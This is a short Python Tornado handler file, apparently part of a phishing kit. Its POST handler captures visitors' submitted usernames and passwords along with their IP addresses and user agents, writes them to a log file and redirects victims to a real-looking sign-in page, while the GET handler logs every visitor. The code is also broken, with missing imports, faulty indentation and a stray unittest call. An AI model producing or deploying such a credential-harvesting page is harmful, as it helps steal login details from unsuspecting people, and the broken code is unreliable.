#!/usr/bin/env python
#coding:utf-8
"""
  Author:  pirogue --<p1r06u3@gmail.com>
  Purpose: 
  Created: 2017/4/8
  Site:    http://pirogue.org
"""


import tornado.web
import json

########################################################################
class BaseHandler(tornado.web.RequestHandler):
    """ 基础类 """

    #----------------------------------------------------------------------
   def post(self):
        """ 钓鱼获取post数据 """
        username = self.get_arguments('username')
        passowrd = self.get_arguments('password')
        userAgent = self.request.headers['user-agent'] #获取UA
        ip = self.request.remote_ip #获取IP
        with open('fish.txt', 'a') as f:
            f.write('username:'+ str(username) + ',' + 'password:' + str(passowrd) + ',' + 'post_time:' + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) + ',' + 'userAgent:' + str(userAgent) +','+ 'IP:' + str(ip))
            f.write('\n')
            print('username:'+ str(username) + ',' + 'password:' + str(passowrd) + ',' + 'post_time:' + time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) + ',' + 'userAgent:' + str(userAgent) +','+ 'IP:' + str(ip))
        return self.redirect('https://abc.com/signin.html')
    
    def get(self):
        '''记录访问时间和UA'''
        userAgent = self.request.headers['user-agent'] #获取UA
        ip = self.request.remote_ip #获取IP
        with open('visit.txt', 'a') as f:
            f.write('visit_time:' +  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) + ',' + 'userAgent:' + str(userAgent) +','+ 'IP:' + str(ip))
            f.write('\n')
            print('visit_time:' +  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) + ',' + 'userAgent:' + str(userAgent) +','+ 'IP:' + str(ip))
        return self.render('index.html')

if __name__ == '__main__':
    unittest.main()
